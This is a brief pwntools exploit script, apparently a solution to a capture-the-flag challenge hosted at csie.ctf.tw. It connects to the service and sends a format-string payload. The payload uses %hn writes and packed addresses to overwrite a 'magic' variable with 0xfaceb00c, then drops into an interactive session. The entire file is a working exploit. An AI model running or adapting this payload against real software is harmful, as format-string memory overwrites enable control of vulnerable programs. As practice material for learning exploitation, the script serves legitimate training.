#!/usr/bin/env python
from pwn import *

host = "csie.ctf.tw"
port = 10134
r = remote(host,port)

magic = 0x60106c
target = 0xfaceb00c

r.recvuntil("magic :")
#payload = "AAAA%6$p"
payload = "%45068c%10$hn%19138c%11$hnxxxxxx"
payload += p64(magic) + p64(magic+2)
r.sendline(payload)

r.interactive()
